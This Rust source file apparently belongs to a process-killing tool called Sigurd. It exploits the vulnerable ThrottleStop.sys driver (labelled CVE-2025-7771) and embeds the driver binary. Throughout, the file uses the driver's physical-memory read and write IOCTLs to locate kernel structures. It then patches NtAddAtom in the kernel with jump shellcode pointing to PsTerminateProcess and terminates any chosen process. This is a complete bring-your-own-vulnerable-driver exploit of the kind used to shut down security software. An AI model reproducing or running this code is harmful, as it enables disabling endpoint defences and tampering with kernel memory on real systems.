use std::{
    mem, 
    slice,
    ptr::{self, null_mut},
    os::windows::ffi::OsStrExt,
    ffi::{CStr, CString, OsStr}
};

use winapi::{
    ctypes::c_void, 
    shared::{
        ntdef::{NT_SUCCESS, NTSTATUS, PVOID}, 
        minwindef::{BOOL, DWORD, FALSE, HMODULE}, 
        ntstatus::{STATUS_INFO_LENGTH_MISMATCH, STATUS_MCA_EXCEPTION}
    }, 
    um::{
        ioapiset::DeviceIoControl, 
        fileapi::{CreateFileW, OPEN_EXISTING}, 
        handleapi::{CloseHandle, INVALID_HANDLE_VALUE}, 
        winnt::{FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, GENERIC_READ},
        libloaderapi::{GetModuleHandleW, GetProcAddress, LoadLibraryW} 
    }
};

use ntapi::{ntexapi::NtQuerySystemInformation, ntldr::RTL_PROCESS_MODULES};

use superfetch::MemoryMap;

use crate::{
    trace,
    utils::{error::SigurdError, to_wstring},
    drivers::{
        KillerDriver, 
        throttlestop::offsets::{EprocessOffsets, obtain_offsets}
    }
};

mod offsets;
mod types;

const DRIVER_NAME: &str = "ThrottleStop";
const VERSION: &str = "0.0.1";

const PHYS_READ: u32 = 0x80006498;
const PHYS_WRITE: u32 = 0x8000649C;

const DRIVER_DEVICE: &str = "\\\\.\\ThrottleStop";
static DRIVER: &'static [u8] = include_bytes!("../../../drivers/ThrottleStop.sys");

type NtAddAtomTerminateFn = unsafe extern "system" fn(
    eprocess: u64,
    status: NTSTATUS,
) -> NTSTATUS;

pub struct ThrottleStop {
    device: *mut c_void,
    memory_map: Option<MemoryMap>,
    ntoskrnl_base_va: u64,
    pub system_erocess_va: u64,
    ntaddatom_offset: u64,
    psterminateprocess_va: u64,
    pub offsets: EprocessOffsets,
}

#[allow(unused)]
#[repr(C)]
struct PhysWrite {
    physical_address: PVOID,
    value: u64,
}

impl ThrottleStop {
    fn get_device() -> Result<*mut c_void, SigurdError> {
        unsafe {
            let handle = CreateFileW(
                to_wstring(DRIVER_DEVICE).as_ptr(), 
                GENERIC_READ, 
                FILE_SHARE_READ,
                null_mut(), 
                OPEN_EXISTING, 
                FILE_ATTRIBUTE_NORMAL, 
                null_mut(),
            );

            if handle == INVALID_HANDLE_VALUE { 
                return Err(SigurdError::last("Can't get ThrottleStop device handle"));
            } else {
                return Ok(handle);
            }
        }
    }

    fn lookup_system_module_base(module_name: &str) -> Result<u64, SigurdError> {
        unsafe {
            let mut buffer_size: u32 = 0;

            // Initial probe
            let mut status: NTSTATUS = NtQuerySystemInformation(
                11, // SystemModuleInformation
                ptr::null_mut(),
                buffer_size,
                &mut buffer_size,
            );

            let mut buffer: Vec<u8>;

            while status == STATUS_INFO_LENGTH_MISMATCH {
                buffer = vec![0u8; buffer_size as usize];

                status = NtQuerySystemInformation(
                    11,
                    buffer.as_mut_ptr() as PVOID,
                    buffer_size,
                    &mut buffer_size,
                );

                if NT_SUCCESS(status) {
                    let modules = buffer.as_ptr() as *const RTL_PROCESS_MODULES;
                    let count = (*modules).NumberOfModules as usize;

                    let modules_slice = slice::from_raw_parts(
                        (*modules).Modules.as_ptr(),
                        count,
                    );

                    for module in modules_slice {
                        let base_ptr =
                            module.FullPathName.as_ptr().add(module.OffsetToFileName as usize);

                        let current_name = match CStr::from_ptr(base_ptr as *const i8).to_str() {
                            Ok(s) => s,
                            Err(_) => continue,
                        };

                        if current_name.eq_ignore_ascii_case(module_name) {
                            return Ok(module.ImageBase as u64);
                        }
                    }

                    return Err(SigurdError::default(format!("Can't find system module: {}", module_name).as_str()));
                }
            }

            Err(SigurdError::default(format!("Unexpected status from NtQuerySystem information: {}", status).as_str()))
        }
    }

    fn load_ntoskrnl() -> Result<HMODULE, SigurdError> {
        let wide: Vec<u16> = OsStr::new("ntoskrnl.exe")
            .encode_wide()
            .chain(Some(0))
            .collect();

        let hmod = unsafe { LoadLibraryW(wide.as_ptr()) };
        if hmod.is_null() {
            Err(SigurdError::default("Failed to load ntoskrnl.exe"))
        } else {
            Ok(hmod)
        }
    }

    fn lookup_kexport_offset(export: &str) -> Result<u64, SigurdError> {
        let hmod = Self::load_ntoskrnl()?;

        let cname = CString::new(export)
            .map_err(|_| SigurdError::default("Invalid export name"))?;

        let proc = unsafe { GetProcAddress(hmod, cname.as_ptr()) };
        if proc.is_null() {
            return Err(SigurdError::default("Export not found"));
        }

        Ok(proc as u64 - hmod as u64)
    }

    fn read(&self, target_addr: u64) -> Result<u64, SigurdError> {
        let target_addr_pa = match &self.memory_map {
            Some(mm) => mm.translate(target_addr as *mut c_void)?,
            None => return Err(SigurdError::default("No memory map defined")),
        };

        let mut bytes_returned: DWORD = 0;
        let mut output: u64 = 0;
        let mut phys_addr = target_addr_pa as u64;


        let result: BOOL = unsafe {
            DeviceIoControl(
                self.device,
                PHYS_READ,
                &mut phys_addr as *mut u64 as PVOID,
                std::mem::size_of::<u64>() as DWORD,
                &mut output as *mut u64 as PVOID,
                std::mem::size_of::<u64>() as DWORD,
                &mut bytes_returned,
                std::ptr::null_mut(),
            )
        };

        if result != FALSE {
            Ok(output)
        } else {
            Err(SigurdError::last("Unable read memory"))
        }
    }

    fn write(&self, target_addr: u64, payload: u64) -> Result<bool, SigurdError> {
        let target_addr_pa = match &self.memory_map {
            Some(mm) => mm.translate(target_addr as *mut c_void)?,
            None => return Err(SigurdError::default("No memory map defined")),
        };
        let phys_addr = target_addr_pa as u64;

        let mut buffer = PhysWrite {
            physical_address: phys_addr as *mut c_void,
            value: payload,
        };

        let mut bytes_returned: DWORD = 0;

        let result: BOOL = unsafe {
            DeviceIoControl(
                self.device,
                PHYS_WRITE,
                &mut buffer as *mut _ as PVOID,
                std::mem::size_of::<PhysWrite>() as DWORD,
                std::ptr::null_mut(),
                0,
                &mut bytes_returned,
                std::ptr::null_mut(),
            )
        };

        if result != FALSE {
            Ok(true)
        } else {
            Err(SigurdError::last("Unable to write memory"))
        }
    }

    fn find_ps_terminate_process(&self, function_off: u64) -> Result<u64, SigurdError> {
        const MAX_SCAN_SIZE: usize = 0x200;

        let mut ip = self.ntoskrnl_base_va + function_off;
        let mut scanned: usize = 0;
        let mut call_count: usize = 0;

        while scanned < MAX_SCAN_SIZE {
            let opcode = (self.read(ip)? & 0xFF) as u8;

            // call rel32 (E8 xx xx xx xx)
            if opcode == 0xE8 {
                call_count += 1;

                let b1 = (self.read(ip + 1)? & 0xFF) as u32;
                let b2 = (self.read(ip + 2)? & 0xFF) as u32;
                let b3 = (self.read(ip + 3)? & 0xFF) as u32;
                let b4 = (self.read(ip + 4)? & 0xFF) as u32;

                let rel32 = i32::from_le_bytes([
                    b1 as u8,
                    b2 as u8,
                    b3 as u8,
                    b4 as u8,
                ]);

                let next_rip = ip + 5;
                let target = next_rip.wrapping_add(rel32 as i64 as u64);

                if call_count == 2 {
                    return Ok(target);
                }

                ip += 5;
                scanned += 5;
                continue;
            }

            ip += 1;
            scanned += 1;
        }

        Err(SigurdError::default("PsTerminateProcess call not found"))
    }

    unsafe fn resolve_nt_add_atom() -> Result<NtAddAtomTerminateFn, SigurdError> {
        unsafe {
            let ntdll: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();

            let hmodule: HMODULE = GetModuleHandleW(ntdll.as_ptr());
            if hmodule.is_null() {
                return Err(SigurdError::default("Can't get handle to ntdll.dll"));
            }

            let cname = CString::new("NtAddAtom")
                .map_err(|_| SigurdError::default("CString error"))?;

            let proc = GetProcAddress(hmodule, cname.as_ptr());
            if proc.is_null() {
                return Err(SigurdError::default("Can't find NtAddAtom in ntdll.dll"));
            }

            Ok(core::mem::transmute::<*const c_void, NtAddAtomTerminateFn>(
                proc as *const c_void,
            ))
        }
    }
}

impl KillerDriver for ThrottleStop {
    fn new() -> Result<Box<dyn KillerDriver>, crate::utils::error::SigurdError> where Self: Sized + 'static {
        return Ok(Box::new(Self { 
            device: 0 as *mut c_void,
            memory_map: None,
            ntoskrnl_base_va: 0,
            system_erocess_va: 0,
            ntaddatom_offset: 0,
            psterminateprocess_va: 0,
            offsets: obtain_offsets()?
        }));
    }

    fn init(&mut self) -> Result<bool, SigurdError> {
        // Setup device handle
        self.device = Self::get_device()?;
        trace!("Got device handle");

        // Get kernel base
        self.ntoskrnl_base_va = Self::lookup_system_module_base("ntoskrnl.exe")?; 
        trace!("Found ntoskrnl base address: {:#x}", self.ntoskrnl_base_va);
        
        // Get gadget function offset
        self.ntaddatom_offset = Self::lookup_kexport_offset("NtAddAtom")?;
        trace!("Found NtAddAtom offset: {:#x}", self.ntaddatom_offset);

        // Setup memory translation
        self.memory_map = unsafe { Some(MemoryMap::snapshot()?) };
        trace!("Memory map initialized");

        // Locate system eprocess
        let system_eprocess = self.read(self.ntoskrnl_base_va + Self::lookup_kexport_offset("PsInitialSystemProcess")?)?;
        self.system_erocess_va = system_eprocess;
        trace!("System _EPROCESS: {:#x}", self.system_erocess_va);

        // Get terminate function address
        let wheaterminateprocess_offset = Self::lookup_kexport_offset("WheaTerminateProcess")?;
        trace!("Found WheaTerminateProcess offset: {:#x}", wheaterminateprocess_offset);
        self.psterminateprocess_va = self.find_ps_terminate_process(wheaterminateprocess_offset)?;
        trace!("Found PsTerminateProcess offset: {:#x}", self.psterminateprocess_va - self.ntoskrnl_base_va);

        // Remove the memory map
        self.memory_map = None;

        return Ok(true);
    }

    fn destruct(&mut self) -> Result<bool, SigurdError> {
        unsafe {
            match CloseHandle(self.device) {
                0 => {
                    return Err(SigurdError::last("Can't close device handle"));
                }
                _ => {
                    return Ok(true);
                }
            }
        }
    }

    fn name(&self) -> &'static str {
        return DRIVER_NAME;
    }

    fn version(&self) -> &'static str {
        return VERSION;
    }

    fn description(&self) -> &'static str {
        return "ThrottleStop (CVE-2025-7771)";
    }

    fn get_file(&self) -> Result<Vec<u8>, crate::utils::error::SigurdError> {
        let v = DRIVER.to_vec();
        return Ok(v);
    }

    fn kill(&mut self, pid: u32) -> Result<(), crate::utils::error::SigurdError> {  
        unsafe {  
            let target_pid = pid as u64;

            // Check memory map
            if self.memory_map.is_none() {
                self.memory_map = Some(MemoryMap::snapshot()?);
                trace!("Memory map initialized");
            } else {
                trace!("Memory map was initialized");
            }

            // Iterate over Active Process list
            let mut search_eprocess: u64 = self.system_erocess_va;
            let target_eprocess: u64;
            let mut current_process_pid: u64 = 0;
            while current_process_pid != 4 {
                search_eprocess = self.read(search_eprocess + (self.offsets.apl as u64))? - (self.offsets.apl as u64);
                current_process_pid = self.read(search_eprocess + (self.offsets.pid as u64))?;
                if current_process_pid == target_pid {
                    break;
                }
            }

            if current_process_pid != 4 {
                target_eprocess = search_eprocess;
                trace!("Found target process _EPROCESS: {:#x}", target_eprocess);
            } else {
                return Err(SigurdError::default("Can't find target process"));
            }

            // Setup shellcode and placeholder
            let mut shellcode: [u8; 12] = [
                0x48, 0xB8,                         // mov rax, imm64
                0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00,             // <address>
                0xFF, 0xE0,                         // jmp rax
            ];

            let mut original: [u8; 16] = [0u8; 16];

            ptr::copy_nonoverlapping(
                &self.psterminateprocess_va as *const u64 as *const u8,
                shellcode.as_mut_ptr().add(2),
                mem::size_of::<u64>(),
            );

            // Get NtAddAtom
            let nt_add_atom = Self::resolve_nt_add_atom()?;

            // Read original stub
            let mut shell_split = self.read(self.ntoskrnl_base_va + self.ntaddatom_offset)?;
            ptr::copy_nonoverlapping(
                &shell_split as *const u64 as *const u8,
                original.as_mut_ptr(),
                mem::size_of::<u64>(),
            );

            shell_split = self.read(self.ntoskrnl_base_va + self.ntaddatom_offset + 0x8)?;
            ptr::copy_nonoverlapping(
                &shell_split as *const u64 as *const u8,
                original.as_mut_ptr().add(8),
                mem::size_of::<u64>(),
            );

            // Write shellcode
            shell_split = 0;  
            ptr::copy_nonoverlapping(
                shellcode.as_ptr(),
                &mut shell_split as *mut u64 as *mut u8,
                mem::size_of::<u64>(),
            );
            self.write(self.ntoskrnl_base_va + self.ntaddatom_offset, shell_split)?;
            
            shell_split = 0;
            ptr::copy_nonoverlapping(
                shellcode.as_ptr().add(8),
                &mut shell_split as *mut u64 as *mut u8,
                mem::size_of::<u32>(),
            );
            self.write(self.ntoskrnl_base_va + self.ntaddatom_offset + 0x8, shell_split)?;
            trace!("Patched kernel function");

            // Call
            let result: NTSTATUS = nt_add_atom(target_eprocess, STATUS_MCA_EXCEPTION);
            trace!("Patched function called");

            // Restore original stub
            ptr::copy_nonoverlapping(
                original.as_ptr(),
                &mut shell_split as *mut u64 as *mut u8,
                mem::size_of::<u64>(),
            );
            self.write(self.ntoskrnl_base_va + self.ntaddatom_offset, shell_split)?;

            shell_split = 0;
            ptr::copy_nonoverlapping(
                original.as_ptr().add(8),
                &mut shell_split as *mut u64 as *mut u8,
                mem::size_of::<u64>(),
            );
            self.write(self.ntoskrnl_base_va + self.ntaddatom_offset + 0x8, shell_split)?;
            trace!("Resoted original function stub");
        
            // Clear the memory map
            self.memory_map = None;

            if NT_SUCCESS(result) {
                return Ok(());
            } else {
                return Err(SigurdError::default("Call to PsTerminateProcess wasn't successfull"));
            }
        }
    }
}
